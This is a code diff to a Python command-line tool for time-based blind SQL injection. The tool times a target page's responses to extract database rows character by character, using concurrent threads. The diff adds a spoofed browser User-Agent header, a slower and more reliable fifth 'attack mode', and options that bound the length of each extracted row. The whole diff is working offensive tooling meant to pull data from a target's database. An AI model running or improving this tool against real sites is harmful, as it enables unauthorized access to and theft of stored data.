@@ -14,8 +14,8 @@ _column = None
 _ref_resp_time = None   # Average time of a response from the page.
 _time_to_sleep = None   # Time to sleep during the injections.
 _threads = None         # Number of threads to create when getting multiple rows.
-
-MAX_ROW_LENGTH = 128    # Max number of characters of a row.
+_max_row_length = None
+_min_row_length = None
 
 _bool_injections = {    # Injections to detect a character or the length of a row.
     "unquoted": {
@@ -46,10 +46,15 @@ def _is_number(string):
 # Returns the response time for a GET/POST requests, with the given parameters.
 def _get_resp_time(payload):
 
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) '
+                      'Chrome/39.0.2171.95 Safari/537.36'
+    }
+
     if _method == 'get':
-        return requests.get(_url, params=payload).elapsed.total_seconds()
+        return requests.get(_url, params=payload, headers=headers).elapsed.total_seconds()
     elif _method == 'post':
-        return requests.post(_url, data=payload).elapsed.total_seconds()
+        return requests.post(_url, data=payload, headers=headers).elapsed.total_seconds()
 
 
 def _delay():
@@ -99,8 +104,10 @@ def _init_sleep_time():
 
     if _mode == 0 or _mode == 1 or _mode == 2:
         _time_to_sleep = 2.5 * _ref_resp_time
-    else:
+    elif _mode == 3:
         _time_to_sleep = 5.5 * _ref_resp_time
+    else:
+        _time_to_sleep = 8.0 * _ref_resp_time
 
 
 # Returns the character at index 'index', or None if not found.
@@ -171,13 +178,13 @@ def _get_row_length(row):
 
     length = None
 
-    loop = True             # If false the while loop ends.
+    loop = True                     # If false the while loop ends.
     iteration = 0
-    test_length = 1         # Length currently testing.
-    while test_length <= MAX_ROW_LENGTH and loop:
+    test_length = _min_row_length   # Length currently testing.
+    while test_length <= _max_row_length and loop:
 
         # Make 'n' tests concurrently.
-        n = 10
+        n = 1 if (_max_row_length - _min_row_length) < 10 else 10
         pool = ThreadPool(processes=n)
 
         results = []
@@ -199,7 +206,7 @@ def _get_row_length(row):
             # When the length is found, break the loop.
             if results[j].get() > _time_to_sleep:
                 loop = False
-                length = j + n * iteration + 1
+                length = _min_row_length + j + n * iteration
 
         iteration += 1
 
@@ -213,7 +220,7 @@ def _get_row_length(row):
 
 
 # Returns the rows from row to (row + rows).
-# Searches '_threads' rows at a time.
+# Searches '_threads' rows at once.
 def _get_rows(row, rows):
 
     start = datetime.now()
@@ -291,7 +298,7 @@ def _get_row(row, length, progress, total):
             value += '?'
         else:
             value += str(char)
-        # Progress is the list of chars found as far. It's used to know the percentage of work done as far.
+        # Progress is the list of chars found as far. It's used to know the percentage of work done so far.
         progress.append(char)
         prefix = '[*] getting ' + str(_threads) + ' ' + ('rows' if _threads > 1 else 'row') + ':'
         print_progress(len(progress), total, prefix=prefix, suffix='complete', endl=False)
@@ -390,7 +397,7 @@ group0.add_argument(
 parser.add_argument(
     '-M',
     type=int,
-    help='attack mode (from 0, the least reliable but the fastest, to 3, the most reliable but the slowest)'
+    help='attack mode (from 0, the least reliable but the fastest, to 4, the most reliable but the slowest)'
 )
 
 parser.add_argument(
@@ -443,6 +450,16 @@ subparser1.add_argument(
     type=int,
     help='number of rows to select'
 )
+subparser1.add_argument(
+    '--max_length',
+    type=int,
+    help='max length of a selected row'
+)
+subparser1.add_argument(
+    '--min_length',
+    type=int,
+    help='min length of a selected row'
+)
 
 args = parser.parse_args()
 
@@ -463,8 +480,16 @@ if ('T' in args) and (args.T is not None) and args.T < 1:
 if ('T' in args) and ('rows' in args) and (args.T is not None) and (args.rows is None):
     print('Note: if the number of rows is 1 the number of threads is set to 1')
 
-if ('M' in args) and (args.M is not None) and (args.M > 3 or args.M < 0):
+if ('M' in args) and (args.M is not None) and (args.M > 4 or args.M < 0):
     parser.error('invalid attack mode value')
+    exit(-1)
+
+if ('max_length' in args) and (args.max_length is not None) and (args.max_length <= 0):
+    parser.error('invalid max row length value')
+    exit(-1)
+
+if ('min_length' in args) and (args.min_length is not None) and (args.min_length < 0):
+    parser.error('invalid min row length value')
     exit(-1)
 
 # Initialize the global variables:
@@ -479,6 +504,14 @@ if 'M' in args and args.M is not None:
     _mode = args.M
 else:
     _mode = 3
+if 'max_length' in args and args.max_length is not None:
+    _max_row_length = args.max_length
+else:
+    _max_row_length = 128
+if 'min_length' in args and args.min_length is not None:
+    _min_row_length = args.min_length
+else:
+    _min_row_length = 0
 _init_ref_resp_time()
 _init_sleep_time()
 
